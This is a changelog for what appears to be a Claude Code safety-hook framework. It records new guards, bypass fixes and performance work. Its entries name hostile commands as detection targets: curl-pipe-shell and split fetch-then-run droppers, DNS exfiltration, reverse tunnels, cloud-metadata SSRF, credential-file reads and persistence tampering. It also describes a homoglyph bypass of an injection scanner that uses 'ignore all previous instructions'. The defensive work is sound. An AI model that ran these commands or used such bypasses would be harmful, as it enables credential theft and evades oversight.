- [2.16.0] - 2026-07-19 — feat: **`lockfile-integrity-guard` — the last clean footgun win.** Dependency lockfiles (`package-lock.json`, `yarn.lock`, `pnpm-lock.yaml`, `Cargo.lock`, `go.sum`, `Gemfile.lock`, `composer.lock`, `poetry.lock`, `bun.lockb`, `flake.lock`, …) are machine-generated — they encode a resolved dependency graph plus integrity hashes. When an agent hand-edits one (to "fix" a merge conflict or bump a version without running the package manager) it corrupts those hashes/resolution, so `npm ci` / `yarn --frozen` / `cargo build --locked` then fail for everyone in CI, or silently install an inconsistent tree. New hook **asks** before a Write/Edit lands on a lockfile — naming the right regenerate command (`npm install`, `pnpm install`, `cargo build`, `go mod tidy`, …) — once per lockfile per session. Distinguishes the lock from its manifest (`package.json`/`Cargo.toml`/`go.mod` are untouched) and is unrelated to `enforce-pkg-manager` (which blocks the *wrong* pm on the Bash channel, never guards lockfile edits). Chose **ask** over hard-deny since a deliberate manual merge-resolution is occasionally legitimate. Disable: `SUPERCHARGER_LOCKFILE_GUARD=0`. Full-mode hook count 118 → 119. 24 tests. Suite 1676/0. *(Note: `write-clobber-guard` was evaluated and dropped — it overlaps `confidence-gate`'s existing read-before-write check too much to justify the added nag surface. The guard surface is now considered saturated.)*

- [2.15.1] - 2026-07-19 — fix(sc-update): **`/sc-update` now applies the update on the fly.** Step 2 of the command ran plain `update.sh`, which prompts on stdin ("Update now?" / "Proceed?") — a tool-invoked shell can't answer, so it hung and the user had to run the update by hand. It now runs `update.sh --yes` (skips both prompts; config is still backed up + preserved). The `--check` hint also suggests `--yes`. No behavior change to `update.sh` itself — `--yes`/`-y`/`--non-interactive`/`SUPERCHARGER_NONINTERACTIVE=1` already existed; the command just wasn't using it. (Plugin edition is unaffected — it uses native `/plugin update`.) One-time catch-22: to *get* this fix you still apply 2.15.1 with `bash ~/.claude/supercharger/tools/update.sh --yes` once; after that `/sc-update` self-applies. Suite 1652/0.

- [2.15.0] - 2026-07-19 — feat: **three new enforcement guards + two fixes** (rolls up five branches). **`critical-infra-guard`** (new hook) turns `guardrails.md`'s documented "human review triggers" into enforcement: editing a CI/CD pipeline (`.github/workflows`, `.gitlab-ci.yml`, `Jenkinsfile`, …), container/IaC file (`Dockerfile`, `docker-compose`, `*.tf`), DB migration (`*/migrations/*`, `schema.prisma`), or auth-logic file (`*/auth/*`, `passport.*`) now emits `permissionDecision:ask` — one conscious confirm, asked once per file per session; survives autopilot (the shared `lib-smart-approve` verdict declines auto-approval for these paths, same matcher `lib-critical-infra.sh` → no drift). **`webfetch-egress-guard`** (new hook) closes a **cross-channel parity gap** found in a guard×channel audit: the native `WebFetch`/`WebSearch` tool had **no PreToolUse guard**, so an injection could steer it at cloud instance-metadata (`169.254.169.254` → credential theft) or an internal IP (SSRF). `safety.sh` already blocked this on Bash and `mcp-egress-guard` on MCP — this is the un-mirrored sibling (metadata/webhook/paste → deny, private-net → warn); the audit also **debunked** an alleged Bash-metadata gap (`safety.sh:288` already had it) and extended `output-secrets-scanner` to scan WebFetch/WebSearch results. **`git-remote-guard`** (new hook) — `git-safety` polices *how* you push (force/`--no-verify`/protected branch) but never *where*; this asks before pushing the whole repo (source + history + committed secrets) to a non-origin host, or hijacking origin's URL to a foreign host — a whole-repo exfil vector. Asks (forks/mirrors are legit), once per destination host per session. **Fix — autopilot ceiling:** `/sc-autopilot 6h` silently clamped to 2h; the ceiling is now **8h and configurable** (`SUPERCHARGER_AUTOPILOT_MAX_HOURS`), and over-ceiling requests clamp **loudly** instead of silently. **Fix — subagent report recovery:** `subagent-safety`'s report-pin told every subagent to Write its report as its last tool call, which **hijacked the final-message slot** (parent got a stub/meta-note and redid the work); the pin now says "return findings inline, don't write a file" (the transcript scraper is the real safety net), `subagent-report-notify` catches meta-note evaders, and a new *Subagent Report Recovery* rule tells the main where recovered reports live. Full-mode hook count 115 → 118, safe 28 → 30. Suite 1600/0.

- [2.14.3] - 2026-07-16 — perf: **consolidated the three `commit-*` hooks into one `commit-guard.sh`** — completes the hook-latency work (the "feels slower" feedback). `commit-secret-guard` (secret in the staged diff, default on), `commit-coauthor-guard` (Co-Authored-By trailer, opt-in), and `commit-check` (Conventional Commit format, opt-in) each fired **and fast-exited on every Bash call** — three process forks doing nothing on the common path. Merged into one hook that reads input once and runs all three as **independent self-gating checks** (each keeps its exact flag + block reason; any can deny). Removes 2 forks from every Bash call. Always registered + self-gating, so the opt-in semantics are preserved identically on both the installer and plugin channels. Across the three perf releases (2.14.1–2.14.3) the full sync PreToolUse chain on macOS bash 3.2 dropped from **~1427ms → ~570ms per Bash call (~60%)**. Behavior verified against the full enforcement suite + the (repointed) commit test files; full-mode hook count 116 → 115. Suite 1589/0. *(Tip for any remaining slowness: `/profile fast` skips the heaviest optional hooks.)*

- [2.14.2] - 2026-07-16 — perf: **cut the per-hook floor across the whole framework — ~25% less blocking overhead per Bash call** (measured 1427ms → 1079ms for the full sync PreToolUse chain on macOS bash 3.2). Two changes: (1) **replaced the `$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)` self-location idiom — a subshell fork — with fork-free `${BASH_SOURCE[0]%/*}` in 104 hooks** (measured ~31ms saved per source; and because `lib-suppress`/`lib-timing` were swept too, the saving compounds — every hook sources one of them, which then sourced `lib-paths`). (2) **`confidence-gate` fast-path** — it only gates *destructive* Bash, so inert commands now skip its ~100ms score computation (150ms → 106ms). `safety.sh` also dropped 95ms → 71ms from the fork-free sourcing. Verified against the full enforcement suite (all 104 rewrites still resolve their libs). Remaining lever (next): consolidate the `commit-*` trio (3 hooks that fork + fast-exit on every Bash call) into one. Suite 1590/0.

- [2.14.1] - 2026-07-16 — perf(safety): **`safety.sh` ~40% faster on the most common Bash calls** (measured 150ms → 95ms median on macOS bash 3.2). The security hook is the heaviest per-tool-call cost, and it did a full destructive/exfil scan even for inert reads like `ls`, `git status`, `git log`, `echo`. Added a **fail-safe fast-path**: a command skips the scan only if it is a *bare* verb with **no shell metacharacter** (so nothing can chain / redirect / subshell / exec inside it) **and** is one that cannot read arbitrary file content — `cat`/`head`/`tail`/`wc`/`grep`/`file`/`stat` are deliberately **excluded** and still get the full scan, so sensitive reads (`cat ~/.my.cnf`, `~/.authinfo`) stay blocked. Completeness is *structural*, not a list to maintain: anything not on the tiny content-inert allowlist falls through to the complete scan — the fast-path only trades speed, never safety. Verified against the full enforcement suite (which caught an over-broad first attempt — the safety net working as intended). Also surfaced the bigger systemic cost for a follow-up: the per-hook *floor* (bash startup + lib sourcing + jq), and a mitigation users can apply today — **`/profile fast`** skips the heaviest optional hooks. 3 fast-path tests (incl. a chained-command guard). Suite 1587 → 1590.

- [2.14.0] - 2026-07-16 — feat(strict): **new `/sc-strict <duration>` mode — completes the bounded time-boxed "modes" family.** While active, Supercharger **auto-approves nothing**: every tool call (even the read-only ones it normally waves through) falls through to Claude Code's normal permission prompt, so you eyeball each step — near a deploy, on prod config, or any high-stakes stretch. It's the true inverse of autopilot and **overrides it**: the strict check runs *first* in the shared `smart-approve` verdict and returns "not auto-approvable," so a strict window beats an autopilot window automatically — the family's **tighten-beats-loosen** rule, now concrete and test-locked (strict + autopilot both on → nothing auto-approved). Strict adds no new blocks (the always-on safety hooks already do that) — it only removes auto-approvals. **No new hook** — it's a few lines in `hooks/lib-smart-approve.sh` (so `notify-permission` honors it too) plus `tools/strict.sh`; hook count unchanged. Same family conventions: per-session default (`scope/.strict-until-<session-id>`, `global` opt-in), per-call expiry, 2h cap, `🛡 Strict: Nm left` statusline. With this the modes family is **deliberately complete at three** (autopilot loosens; read-only + strict tighten) — no seven-mode catalog; further modes only if real usage pulls them. 10 tests. Suite 1577 → 1587.

- [2.13.0] - 2026-07-16 — feat(readonly): **new `/sc-readonly <duration>` mode — the inverse of autopilot.** While active it **blocks every file edit** (Write/Edit/MultiEdit/NotebookEdit) and **every mutating shell command** (`rm`/`mv`/`cp`/`mkdir`/`touch`/`chmod`/`ln`/`dd`/`tee`/`truncate`, `sed -i`, `git commit`/`push`/`add`/`merge`/`reset`/`checkout`/`restore`/`clean`/`pull`…, `npm`/`yarn`/`pnpm`/`pip`/`cargo`/`go`/`brew`/`apt` installs, and output redirections that write a file) — while reads, searches, and planning stay allowed. For exploring or reviewing a codebase with zero risk of accidental changes. This begins a deliberate, **bounded "time-boxed modes" family**: autopilot *loosens* (skip prompts), read-only *tightens* (block writes), governed by one rule — **tighten beats loosen** (read-only is a PreToolUse `deny`, so it wins over autopilot's auto-approve automatically; verified by test). Carries every autopilot convention: **per-session by default** (`scope/.readonly-until-<session-id>`, `global` opt-in), auto-expiry checked per tool call (no daemon), **2h hard cap**, and a `🔒 Read-only: Nm left` statusline indicator. Near-zero overhead when off (the guard fast-paths out before parsing if no window is set). It's a **workflow guard** ("don't touch"), not a security sandbox — precise for editor tools, best-effort for Bash; the always-on safety hooks remain the real floor. New `hooks/readonly-guard.sh` (PreToolUse) + `tools/readonly.sh`. Full count 115→116 hooks. 15 tests. Suite 1561 → 1577.

- [2.12.2] - 2026-07-16 — feat(autopilot): **`/sc-autopilot` is now per-session by default** — enabling it in one Claude session no longer auto-approves prompts in your *other* concurrent sessions. `/sc-autopilot 30m` scopes to the current session (flag `scope/.autopilot-until-<session-id>`, session id from `CLAUDE_CODE_SESSION_ID` at write time and the PermissionRequest `session_id` at read time); add **`global`** (`/sc-autopilot 30m global`) for the old machine-wide behavior. `smart-approve` approves when *either* the per-session or global window is active; `off` clears both; `status` reports each; the statusline reads both and now shows **`⚡ Autopilot: Nm left`** (added "left" so the countdown is unambiguous). Falls back to global if no session id is available (older Claude Code). 6 tests added (per-session isolation: same-session approves, different-session denied; global-any-session; off-clears-both; no-sid fallback). Suite 1555 → 1561.

- [2.12.1] - 2026-07-15 — fix(update): `/sc-update` **falsely reported "up to date" for a few minutes after every release**. The 2.11.1 fix read the version from `raw.githubusercontent.com`, but that host is **CDN-cached and lags minutes** behind a push — so immediately after a release the check saw the *old* version and reported no update available (observed: said "up to date (2.11.1)" while 2.12.0 was already live). Switched the primary source to the **GitHub contents API with an `Accept: application/vnd.github.raw` header** (`?ref=master`), which is served **fresh, uncached** — a check run seconds after a release now sees the new version. `raw.githubusercontent.com` is kept as a no-rate-limit fallback, and the python REST path as a last resort (both still read `VERSION` from `lib/utils.sh`, never git tags). `curl` honours `http(s)_proxy` throughout. 2 tests added (fresh-API-primary + primary-before-fallback ordering). Suite 1553 → 1555.

- [2.12.0] - 2026-07-15 — feat(autopilot): **new `/sc-autopilot <duration>` command** — a time-boxed "just say yes" window that stops the permission prompts without dropping the safety floor. While active it auto-approves **every** `PermissionRequest` (so you're not asked to confirm each tool call), but the `PreToolUse` safety hooks (`safety.sh`, `path-guard`, `git-safety`, credential/env guards) run independently and **still block** dangerous calls — `rm -rf`, force-push, credential leaks, `curl|bash`, self-modification (both invariants covered by tests). Usage: `/sc-autopilot 30m` (also `2h`, `90s`, or a bare number = minutes), `/sc-autopilot off`, `/sc-autopilot status`. Implemented by writing `scope/.autopilot-until <epoch>`; the window check lives in the shared `lib-smart-approve.sh` verdict so `smart-approve` (approve) and `notify-permission` (skip the desktop ping) stay in sync. **Expiry is evaluated per request — no background timer** — and it's **hard-capped at 2h** so it can't be left on forever. The statusline shows a `⚡ Autopilot: Nm` indicator while active so an open window is never silent. Unlike `/sc off` (which disables *all* guards), autopilot keeps the safety floor — it only removes the yes/no friction. `tools/autopilot.sh` (on/off/status/cap/parse). 12 tests. Suite 1541 → 1553.

- [2.11.1] - 2026-07-15 — fix(update): `/sc-update` reported a **phantom "v3.6.35" update** and would have flagged every future release as stale forever. `update.sh`'s `fetch_remote_version` picked the **highest git tag** (`git ls-remote --tags | sort -V | tail`), but the repo carries **orphaned tags from an earlier scheme** (`v3.6.10`…`v3.6.35`, all dated 2026-04-20) that numerically outrank the current `2.x` line — so the check always resolved to `v3.6.35` regardless of what shipped, and any `2.x` version looked perpetually behind. Fixed to read the **`VERSION` string from `lib/utils.sh` on `master`** (the single source of truth) via `raw.githubusercontent.com` (no `api.github.com` 60/hr rate limit; `curl` honours `http(s)_proxy`), keeping the GitHub contents API as a reachability fallback. `/sc-update` now correctly reports `2.10.x → 2.11.1`. The orphaned `v3.6.x` tags are left in place (deleting published tags is destructive); the fix simply stops trusting them. 3 tests replace the two that encoded the old max-tag behavior. Suite 1540 → 1541.

- [2.11.0] - 2026-07-15 — feat(plugin): **the full Supercharger now installs as a Claude Code plugin** — `/plugin marketplace add smrafiz/claude-supercharger` then `/plugin install claude-supercharger@claude-supercharger`, no shell script. Same safety hooks, code security scanner, token economy, agent routing, and session memory as `install.sh`, delivered through the native plugin system with `/plugin update` versioning. Built as a **single full plugin over a dual-runnable codebase** (not a stripped "lite" edition): a new `hooks/lib-paths.sh` resolves `SUPERCHARGER_HOME` (code) / `SUPERCHARGER_STATE` (mutable state) — defaulting to `~/.claude/supercharger` so the installer path stays **byte-identical**, and switching to `${CLAUDE_PLUGIN_ROOT}` / `${CLAUDE_PLUGIN_DATA}` under the plugin runtime. The instructional/guardrail layer (CLAUDE.md + rules) that a plugin can't write as files is delivered as **SessionStart `additionalContext`** (`hooks/prompt-layer-inject.sh`), and role / economy-tier / MCP-profile are collected via `userConfig` and seeded on first run (`hooks/plugin-config-seed.sh`) — the plugin analog of the installer wizard. `hooks/hooks.json` and the plugin `commands/` are **generated from the single source of truth** (`tools/gen-plugin-hooks.sh`, `tools/gen-plugin-commands.sh`, both `--check`-guarded in CI and regenerated by `bump-version.sh`), so the two distribution channels never drift. `claude plugin validate` passes clean. Documented casualties vs. `install.sh` (namespaced commands `/claude-supercharger:*`, `/sc*` → native `/plugin` verbs, no statusline / settings.json tweaks) are in the README "Install as a plugin" section, with a **pick-one-channel** warning. Full plan + phase ledger: `docs/PLUGIN-DISTRIBUTION-PLAN.md`. 26 new plugin tests (hooks emitter / commands generator / userConfig + seeder). Suite 1509 → 1540. **Installer users are unaffected — `install.sh` is unchanged.**

- [2.10.9] - 2026-07-14 — feat(prompt-secret-guard): **new UserPromptSubmit hook** that blocks a **live credential pasted into the prompt** before it is sent to the model and written to the on-disk transcript JSONL. This closes the last secret-scanning channel: `output-secrets-scanner` covers tool output, `commit-secret-guard` the staged diff, `code-security-scanner` Write/Edit content — but none saw the user's *own typed prompt*, so a pasted AWS key / token / private key / wallet key reached Anthropic + the local transcript unscanned. Reuses the shared `lib-secret-patterns.sh` set (drift-proof: one list, now four channels). Blocks via the UserPromptSubmit `exit 2` contract (verified against CC hook docs) so the secret never reaches the model; reports only THAT a secret was found, never the value; fully fail-open. **Block + override** by design — `SUPERCHARGER_ALLOW_PROMPT_SECRETS=1` for an intentional revoked/test value, `SUPERCHARGER_PROMPT_SECRET_GUARD=0` to disable. Also **tightened the shared `Bearer` pattern** `[A-Za-z0-9._-]+` → `{20,}` so conversational "Bearer authentication" / "Bearer token" no longer false-positive (real bearer tokens are long) — benefits all four channels. From `dwarvesf/claude-guardrails` (`scan-secrets.sh`); its other hooks were already covered, and its kubeconfig deny-rule validated the v2.10.4 fix. Full install count 112 → 113. 12 tests. Suite 1496 → 1509.

- [2.10.8] - 2026-07-14 — feat(git-safety): block the **no-ref file-discard** forms that destroy uncommitted work — `git checkout -- <file>` and `git restore <file>`. `git-safety.sh` already blocked the whole-tree forms (`git checkout .`, `git restore .`, `git checkout <ref> -- .`, `git restore --source=<ref> .`) but let a single-file discard through, so an agent could wipe uncommitted edits to one file unnoticed. Narrowly scoped to preserve the existing **ref-grab allow** policy: `git checkout <ref> -- <file>` and `git restore --source=<ref> <file>` (pulling a file *from another ref* — constructive) stay allowed, as does `git restore --staged <file>` (unstage, worktree untouched); only the pure local-discard forms with no source ref are blocked. Verified clean on `checkout -b`, branch-switch, `--patch`, and the ref-grab/unstage cases. From overlap-auditing `kenryu42/cc-safety-net` (its semantic-parser engine is Node/TS — non-portable — but this specific gap was real; its other defenses — separated rm flags `rm -r -f`, wrapper nesting, `git stash clear`, `git clean -f` — were already covered). 5 tests. Suite 1491 → 1496.

- [2.10.7] - 2026-07-14 — fix(prompt-injection): close a **homoglyph bypass** in the PostToolUse injection scanner. It NFKC-normalizes fetched/read output before matching, but NFKC does **not** fold visual confusables — Cyrillic `і/о/а/е/р/с`, Greek `ο/ρ/α/ε`… render identically to Latin letters but are different code points. So `іgnоre all previous instructions` (Cyrillic і/о) evaded every pattern (verified: the ASCII form blocks, the homoglyph form sailed through). Added a zero-dep confusables fold (a built-in Cyrillic/Greek→Latin `str.maketrans` map) right after the NFKC step, so `іgnоre` → `ignore` before matching. The fold only rewrites non-ASCII confusables to ASCII — base64 (ASCII) and zero-width (category Cf) checks are untouched, and benign non-Latin prose folds to Latin gibberish that doesn't spell a trigger phrase (no false positives; verified against Russian text). From overlap-auditing `lasso-security/claude-hooks` (its other 4 categories — instruction-override, DAN/persona, base64+zero-width, token markers — were already covered; its fake-system-role-JSON and leetspeak additions were **rejected** as too FP-prone on fetched AI/API docs). 3 tests (2 homoglyph-block, 1 benign-foreign-allow). Suite 1488 → 1491.

- [2.10.6] - 2026-07-14 — fix(selfmod): stop the Bash-channel self-modification guard from **false-positive-blocking read-only introspection**. The check (safety.sh) ORed "command *mentions* a guardrail-config filename" with "command contains any `>` / verb substring" — so a plain read like `cat ~/.claude/supercharger/scope/.disabled-hooks 2>/dev/null` tripped it, because the `2>` **stderr redirect** matched the bare `>`. Reported from the field: `/sc-status`'s own scope reads were being blocked (two `self-modification` entries per status run), and the command couldn't introspect its own state — a couple of status fields silently fell back to defaults instead of ground truth. Root cause: the write was never required to **target** the config file. Rewrote to fire only when a config file is the actual write target — (a) a redirect *into* it (`> cfg`, `>> cfg`, `2> cfg`), (b) an in-place/move/copy/remove/truncate verb whose *argument* is a config file, or (c) an interpreter opening it in write/append mode. Plain reads, `cat cfg > /tmp/elsewhere`, and unrelated fd-redirects now pass; every real write (`echo x > cfg`, `sed -i … cfg`, `tee cfg`, `rm cfg`, `2>cfg`, `open(cfg,'w')`) stays blocked. 5 tests (3 read-allowed incl. the reported `2>/dev/null` form, 2 write-still-blocked). Suite 1483 → 1488.

- [2.10.5] - 2026-07-14 — feat(db-guard): extend the `database` safety category with **`TRUNCATE`** and **`DELETE FROM … ` without a `WHERE` clause** — the two mass-wipe footguns `DB_PATTERNS` didn't cover (it had `DROP TABLE`/`DROP DATABASE` + the ORM schema-drops, but a bare `DELETE FROM users` or `TRUNCATE users` sailed through). From overlap-auditing `sangrokjung/claude-forge`'s `db-guard.sh` (everything else it does — output-secret filtering, curl-pipe-sh, MCP rate-limiting, OWASP auto-scan — was already covered by `output-secrets-scanner` / `safety.sh` droppers / `mcp-circuit-breaker` / `code-security-scanner`). **TRUNCATE**: matches the optional-`TABLE` Postgres form too, and the required letter/quote after the space avoids colliding with the unix `truncate -s 0` command (already caught separately). **DELETE-without-WHERE**: POSIX ERE has no lookahead, so it's gated by *positive shape* — the table identifier must be immediately followed by a statement terminator (`;`, closing shell quote, backtick, `|`, `&`, `)`, or end-of-command), so `DELETE FROM t WHERE …` (space+letter after the identifier) never matches. Handles double- and single-quoted SQL (`psql -c "…"`, `mysql -e '…'`) and `schema.table`. `UPDATE … ` without `WHERE` was **deliberately not added** — equally destructive but far more often intentional (config/flag tables), so it fails the low-FP bar. Opt out per-project via `disableSecurityCategories:["database"]`. 6 tests (TRUNCATE ×2, DELETE-no-WHERE ×2, DELETE-with-WHERE allowed, unix-truncate allowed). Suite 1477 → 1483.

- [2.10.4] - 2026-07-14 — fix(sensitive-files): close a **kubeconfig read gap** surfaced by auditing `adityaarakeri/claude-on-a-leash` (all 6 of its hooks were already covered *except* this). `env-file-guard.sh`'s Read-channel case list guarded `id_rsa`/`.pem`/`.aws`/`gcloud`/`.docker` but **not `kubeconfig` / `.kube/config`** — so reading cluster credentials (which grant full API access) via the **Read tool** bypassed the guard, even though `safety.sh` already blocked `cat ~/.kube/config` on the **Bash** channel. A textbook cross-channel parity drift. Added `kubeconfig` (bare basename) + `*/.kube/config` (path) to `env-file-guard.sh`, mirrored the pattern into `safety-detect.py`'s `_SENSITIVE_NAME_RE`, and — critically — added the missing `*kubeconfig*|*.kube/config*` trigger to `safety.sh`'s `_NEED_PY` fast-path gate (without it the new regex is dead code, since the python only runs when a trigger keyword is present — the same gotcha that bit `dig`/`nslookup` and `.tfvars`). Benign `kubeconfig.md` docs stay allowed (no false positive). 6 tests (both channels, both true-positive forms + the doc false-positive guard). Suite 1471 → 1477.

- [2.10.3] - 2026-07-13 — fix(update): `/sc-update`'s version check now uses the **same GitHub channel as the update itself**. It was calling `api.github.com` (the REST API) to read the remote version — a *different host* from the `github.com` git endpoint that `git clone` (the actual update) uses. So the check failed **independently of whether the update would work**: the unauthenticated REST API is capped at **60 requests/hour per IP** (trivially exhausted on a shared/office NAT → `403`), and Python's `urllib` doesn't inherit `git`'s proxy config — either one produced *"could not reach GitHub"* even when `git clone` succeeded. `fetch_remote_version` now runs `git ls-remote --tags` (same `github.com` git channel — works exactly when the update would) and keeps the API only as a fallback. Also fixes a latent comparison bug: the version is now selected by **numeric** semver sort (`sort -t. -k1,1n -k2,2n -k3,3n`), so `2.10.2` correctly ranks above `2.9.17` (a string/lexical compare would have picked `2.9.17` and hidden real updates). +2 regression tests (uses `git ls-remote`; numeric-sort picks the true highest). Suite 1469 → 1471.

- [2.10.2] - 2026-07-13 — fix(update): `/sc-update` no longer clobbers a user's desktop-notification setting. `update.sh` *tried* to preserve the notify state before re-running the installer, but it checked **stale flag filenames** (`.notify-off` / `.notify-sound`) that are never written — the real flags (from `notify-toggle.sh` / `install.sh`) are `.no-desktop-notify` / `.sound-only-notify`. So the detection always fell through to the `on` default, every update passed `--notify on`, and `install.sh` (which unconditionally rewrites the flags) flipped a user who had notifications **off** back **on** (reported from a colleague's update). Corrected all four references across `update.sh`'s two install-invocation blocks. +2 regression tests: one asserts the canonical flag names are used (and the stale ones are gone), one cross-checks that `update.sh` and `notify-toggle.sh` reference the same flag so they can't drift apart again. Suite 1467 → 1469.

- [2.10.1] - 2026-07-13 — fix(sensitive-files): added `*.tfvars` (Terraform variable files — routinely hold DB passwords, cloud creds, API keys) and `*.tokens.json` to `safety-detect.py`'s sensitive-name set + the `safety.sh` fast-path gate, so reading them via a Bash command (`cat prod.tfvars`) is now flagged like `.env`/`.pem`/`id_rsa`. Complements the v2.9.14 `cloud` category (IaC secrets). Verified against `chuckreynolds/claude-secret-guardrails` (everything else it guards — `.env`/`.pem`/`.ssh`/`.aws`/`.npmrc`/`.netrc`/`credentials.json` — was already covered by `env-file-guard` + the sensitive-name set). Benign `.json` (e.g. `package.json`) stays allowed. 3 tests. Suite 1464 → 1467.

- [2.10.0] - 2026-07-13 — **Security-hardening milestone.** Capstone over the 2.9.3–2.9.17 line — a session-long expansion of the enforcement surface, most of it distilled from auditing ~50 "guardrail/harness" repos against Supercharger's thesis (only self-contained, on-thesis, low-FP hooks were adopted; SaaS engines, orchestration frameworks, npm/ML-dependent tools, and prompt-libraries were rejected). Highlights: **6 new hooks** — `file-lease` (concurrent-session write guard), `fact-gate` (opt-in first-touch investigation gate), `mcp-circuit-breaker` (reactive per-server breaker), `commit-secret-guard` (blocks committing a secret in the staged diff), `commit-coauthor-guard` (opt-in, blocks AI-attribution trailers), and `mcp-egress-guard` (blocks metadata-SSRF/webhook/paste egress in MCP tool args). **New read-only `explorer` agent** (Ferdinand Magellan — CC's `Explore` analog). **Hot-files resume** signal + install-count dedup. **Shared `lib-secret-patterns.sh`** (drift-proof) now spanning API keys → Ethereum/BIP-32/Bitcoin-WIF wallet keys → registry cred stores. **`safety.sh` grew a whole modern attack surface**: disk/partition destruction (`wipefs`/`fdisk`/`parted`), a new `cloud` category (instance-metadata SSRF, role-assume/key-creation, container escape, k8s cluster-admin/secret-read, IaC teardown), persistence tamper (sudoers/authorized_keys/launchd-systemd-schtasks/hosts/keychain), and exfil/tunnel (browser-CDP, ngrok/cloudflared/`ssh -R`, split-form script droppers, DNS-exfil). The concluding **Stallion audit** (a 125-guard cross-reference via 4 parallel agents) added ~30 blocked vectors across those categories. Hook contract re-verified against current CC docs (no deprecations; `exit 2 + permissionDecision:deny` retained). **Test suite 1319 → 1464** (+145), zero regressions across every release. No new code in this tag — it marks the milestone. (3.0 remains reserved for the Windows-support merge on `feat/windows-support`.)

- [2.9.17] - 2026-07-13 — feat(mcp-egress): cluster 4/4 (final) of the Stallion audit — the MCP channel. **(1) New `mcp-egress-guard.sh`** (PreToolUse `mcp__`): walks an MCP tool's arguments (recursively — dict/list), extracts URLs/hosts, and **blocks** the egress classes an MCP server could be steered into hitting — cloud instance-metadata (SSRF credential theft, `169.254.169.254`/GCP/ECS), chat webhooks (Discord/Slack/Teams exfil channels), and paste/anonymous-transfer sites (pastebin/transfer.sh/file.io/0x0.st/…) — and **warns** (non-blocking) on private-network/loopback targets (internal-service SSRF). This is the MCP-argument channel that `safety.sh`'s Bash-side cloud-metadata block never sees. Default ON, fail-open, `SUPERCHARGER_MCP_EGRESS=0` to disable. 10 tests. **(2) `output-secrets-scanner` now scans MCP responses** — its matcher gained `mcp__` and its extractor stringifies the MCP `tool_response` (MCP replies carry text under `content[]`, not `stdout`, so the scanner was previously inert on them — a real channel gap where a server could return a leaked credential unscanned). Bash/Read behavior unchanged. **(3) Registry credential filenames** (`.docker/config.json`, `.cargo/credentials`, `.gem/credentials`, `pip.conf`) added to `safety-detect.py`'s sensitive-name set. Full install count 111 → 112. Suite 1453 → 1464. **Stallion audit complete**: 4 clusters, ~30 new blocked vectors + 1 new hook, from a 125-guard cross-reference — the audit's disciplined rejects (high-FP `\bprod\b`, oauth-device-flow, registry allowlists, prompt-injection dups, `plugin-*` VS-Code flows) were as valuable as the adoptions.

- [2.9.16] - 2026-07-13 — feat(exfil-tunnel-guard): cluster 3/4 of the Stallion audit — exfil/tunnel command guards (category: network in `safety.sh`, + a DNS arm in `safety-detect.py`). Now blocks: **browser remote-debug** (`--remote-debugging-port`/`-pipe` — drives the *live* Chrome/Chromium over CDP to dump cookies/sessions; the browser category only guarded on-disk profile paths), **reverse tunnels / public port exposure** (`ngrok`, `cloudflared`, `localtunnel`, `serveo`, `chisel`, `bore`, `pinggy`, `tailscale funnel`, and `ssh -R`/`-D` — post-compromise egress + C2 that bypasses the no-outbound model), **split-form remote-script droppers** (`curl -o x.sh … && chmod +x … && ./x.sh` — the fetch-then-exec chain the direct `| sh` rule misses), and **DNS exfiltration via a normal resolver** (`dig`/`nslookup`/`host`/`drill` paired with an encoding/secret payload like `$(whoami)`/`base64`/`.env` — plain `dig example.com` stays allowed via the second-condition gate). Benign forms verified allowed (`dig example.com`, `ssh deploy@host uptime`, `curl -o data.json …`). Fixed two port bugs mid-build: a `--`-leading pattern grep-option collision (wrapped in a group) and an `ssh -R` regex that required a space before the flag. 9 tests (6 blocked + 3 allowed). Suite 1444 → 1453.

- [2.9.15] - 2026-07-13 — feat(persistence-guard): cluster 2/4 of the Stallion audit — `safety.sh` persistence + credentials category extensions for tamper vectors beyond the existing crontab/shell-profile/ssh-keygen blocks. All gated on a WRITE verb so reads/status stay allowed. Now blocks: **sudoers tamper** (write to `/etc/sudoers[.d]`, `visudo`, `NOPASSWD:` grant), **authorized_keys backdoor** (append/copy into an `authorized_keys` file, `ssh-copy-id`), **scheduled-task persistence** (writes to launchd `LaunchAgents`/`LaunchDaemons`, `/etc/systemd/system`, `~/.config/systemd/user`, `/etc/cron*`, plus `launchctl load/bootstrap` and `schtasks /create`), **/etc/hosts traffic-hijack** (remapping a package/AI/registry domain — github/npm/pypi/anthropic/docker — into `/etc/hosts`), **git credential.helper store** (plaintext-store downgrade), and **OS credential-store dump** (`security dump-keychain`, `secret-tool lookup`, `cmdkey /list`). **Deliberately NOT blocked** (too-common-in-legit-automation, would cry-wolf): `ssh StrictHostKeyChecking=no` and `ProxyCommand` jump-hosts — verified allowed by test. Benign forms stay allowed (`cat authorized_keys`, `systemctl status`). 10 tests (7 blocked + 3 allowed). Suite 1434 → 1444.

- [2.9.14] - 2026-07-13 — feat(cloud-guard): new **`cloud`** safety category (cluster 1/4 of a full audit of `efij/secure-claude-code` "Stallion", a 125-guard collection — the richest security-hook repo scanned). `safety.sh` had broad destructive coverage but ZERO hard-block for modern cloud/container/IaC attacks (its `human-approval-gate` terraform/kubectl bits are opt-in soft-warns, not blocks). Now blocks, agent-unprompted: **instance-metadata SSRF** (`169.254.169.254` / GCP `metadata.google.internal` / ECS `169.254.170.2` / IMDS paths — the #1 cloud-cred-theft vector), **assume-role/impersonation** (`aws sts assume-role`, `--impersonate-service-account`, `az account get-access-token`), **long-lived key creation** (`aws iam create-access-key`, `gcloud …keys create`, `az ad sp credential reset`), **container escape** (`--privileged`, `--pid=host`, `--cap-add=SYS_ADMIN`, docker/containerd/crio/podman host sockets, `nsenter`, `chroot /host` — `--net=host` deliberately excluded as too-common-in-dev), **k8s** (`kubectl create clusterrolebinding …cluster-admin`, `kubectl get secret -o yaml`), **IaC teardown** (`terraform/tofu/terragrunt/pulumi destroy` — not `plan -destroy`), and **secret-bearing container builds** (`--build-arg …SECRET=`). All opt-out per-project via `disableSecurityCategories:["cloud"]` for devops work. Benign forms stay allowed (`docker run -p`, `kubectl get pods`, `terraform plan`, `aws s3 ls`). 14 tests (10 blocked + 4 allowed). Suite 1419 → 1434. Clusters 2-4 (persistence/ssh, exfil/tunnel, mcp-egress) follow.

